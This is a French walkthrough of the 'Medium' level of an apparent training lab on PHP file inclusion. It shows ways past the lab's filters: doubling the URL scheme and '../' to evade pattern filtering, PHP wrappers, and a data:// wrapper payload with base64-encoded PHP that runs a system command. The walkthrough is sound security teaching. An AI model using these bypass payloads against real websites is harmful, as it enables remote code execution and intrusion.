# Niveau "Medium"

Sur ce niveau, il ne semble plus possible d'effectuer une RFI ainsi que d'utiliser la technique du path traversal \(mais la LFI reste toujours possible\) :

![](../../../../.gitbook/assets/12000a3502b9dc31280d18f793f10c96.png)

Après quelques essais on devine l'utilisation d'un filtrage des patterns `http://` et `https://`. Ce genre de filtrage est très souvent contournable car il est facile pour le développeur d'oublier un scénario. Il suffit par exemple ici de doubler le schéma désiré :

```http
?page=hthttp://tp://www.google.fr
```

![](../../../../.gitbook/assets/6db04f47f06efb8c2bef57d432450d27.png)

{% hint style="info" %}
Etant donné que seule les protocoles `http://` ou `https://` sont filtrés, il est également possible de passer par un autre protocole \(comme `ftp://`\) afin de réaliser l'attaque
{% endhint %}

Le path traversal semble maintenant impossible à ce niveau :

![](../../../../.gitbook/assets/a4d91e7de5a626a79d995d911f979bfc.png)

Mais contournable avec la même technique de contournement de doublement \(car le filtrage est sans doute effectué sur les occurrences `../` \) :

![](../../../../.gitbook/assets/ec7901f0677409430af1d90c1070d2fc.png)

L'utilisation de wrappers PHP reste tout de même possible :

![](../../../../.gitbook/assets/2057362e5ab96e727601f3daa14c87f9.png)

Mais plus intéressant, l'exécution de code grâce au wrapper `data://` fonctionne également \(un autre wrapper bien dangereux comme il faut 😋\) :

```http
?page=data://text/plain;base64.PD9waHAgc3lzdGVtKCdob3N0bmFtZScpOyA/Pg==
```

![](../../../../.gitbook/assets/30c63e8cd4a4620e2ca9674088884cb4.png)

La payload encodée en base64 étant la suivante :

```php
<?php 
  system('hostname');
?>
```

## 

